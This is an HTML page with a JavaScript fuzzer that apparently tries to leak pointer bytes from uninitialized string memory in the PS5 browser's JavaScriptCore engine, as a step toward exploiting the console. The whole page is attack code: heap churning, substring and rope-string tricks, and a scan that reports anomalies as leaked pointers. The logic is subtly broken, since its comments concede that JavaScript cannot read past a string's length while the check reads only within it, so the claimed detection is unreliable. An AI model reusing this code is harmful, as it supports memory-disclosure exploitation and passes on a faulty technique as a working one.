<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 Uninitialized String Tail Leak</title>
</head>
<body>
<pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
<script>
const L = s => { document.getElementById('log').textContent += s + '\n'; };

L('[*] Starting JSC StringImpl uninitialized tail fuzzer...');

let leaked = false;
let attempts = 0;

// 1. Churn the heap to leave pointers in recently freed memory
L('[*] Churning heap with object allocations...');
let churn = [];
for (let i = 0; i < 10000; i++) {
    churn.push({ a: i, b: "string_data_" + i, c: new ArrayBuffer(64) });
}
churn = null; // Drop references, let GC claim it

// 2. Force substring allocations of specific sizes
// JSC allocates StringImpls in size classes. If it allocates 32 bytes for a 24-byte string,
// the last 8 bytes might be uninitialized.
L('[*] Slicing strings and checking for uninitialized tail bytes...');

for (let i = 0; i < 50000; i++) {
    // Create a base string
    let base = "A".repeat(16) + "B".repeat(16);
    
    // Take a substring that is exactly 24 chars (48 bytes in UTF-16, but JSC might use UTF-8 or Latin1 if ASCII)
    // Let's try to trigger a 24-byte Latin1 string allocation
    let sub = base.substring(0, 24);
    
    // Check the characters. If the engine didn't zero the tail, reading past the logical length
    // via character codes might yield non-'A' values.
    // Actually, JS won't let us read past the logical length.
    // So we rely on a different quirk: concatenating and checking for null bytes or garbage.
    
    // Let's try the Rope string resolution path.
    let rope = "C".repeat(15) + sub;
    
    // When the rope is resolved, it allocates a new buffer.
    // If the allocation size is slightly larger than the string, the tail is uninitialized.
    // We can't read past the length in JS, BUT we can encode it to UTF-8 and check length anomalies,
    // OR we can look for instances where the string somehow contains null bytes or high-byte values.
    
    for (let j = 0; j < rope.length; j++) {
        let code = rope.charCodeAt(j);
        // If we see a character that isn't 'A', 'B', or 'C', it might be uninitialized memory
        if (code !== 65 && code !== 66 && code !== 67) {
            L('[!] ANOMALY DETECTED at attempt ' + i);
            L('    Index: ' + j);
            L('    Char Code: 0x' + code.toString(16));
            L('    Rope length: ' + rope.length);
            L('    This is likely a leaked pointer byte!');
            leaked = true;
            break;
        }
    }
    if (leaked) break;
    attempts++;
    if (attempts % 10000 === 0) L('  ... ' + attempts + ' attempts done.');
}

if (!leaked) {
    L('[*] String tail vector failed. Memory is zeroed.');
}

L('[*] Fuzzer finished.');
</script>
</body>
</html>
